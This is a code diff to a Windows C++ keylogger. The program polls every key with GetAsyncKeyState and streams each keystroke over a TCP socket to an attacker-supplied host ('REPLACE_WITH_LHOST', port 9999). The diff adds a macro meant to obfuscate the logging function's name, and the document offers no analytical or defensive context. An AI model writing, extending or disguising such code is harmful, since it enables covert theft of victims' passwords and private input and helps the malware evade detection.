@@ -2,7 +2,10 @@
 #include <windows.h>
 #include <iostream>
 
-void logKey(int key, SOCKET sock) {
+// Obfuscated function names
+#define OBFUSCATE_FNC_NAME(name) name##_fnc
+
+void OBFUSCATE_FNC_NAME(LGKey)(int key, SOCKET sock) {
     char buffer[2];
     buffer[0] = (char)key;
     buffer[1] = '\0';
@@ -25,7 +28,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     sockaddr_in server;
     server.sin_family = AF_INET;
     server.sin_addr.s_addr = inet_addr("REPLACE_WITH_LHOST");
-    server.sin_port = htons(9999);
+    server.sin_port = htons(9999);  // Change to your desired port
 
     if (connect(sock, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
         closesocket(sock);
@@ -36,7 +39,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     while (true) {
         for (int key = 8; key <= 190; key++) {
             if (GetAsyncKeyState(key) == -32767) {
-                logKey(key, sock);
+                OBFUSCATE_FNC_NAME(LGKey)(key, sock);
             }
         }
         Sleep(10);
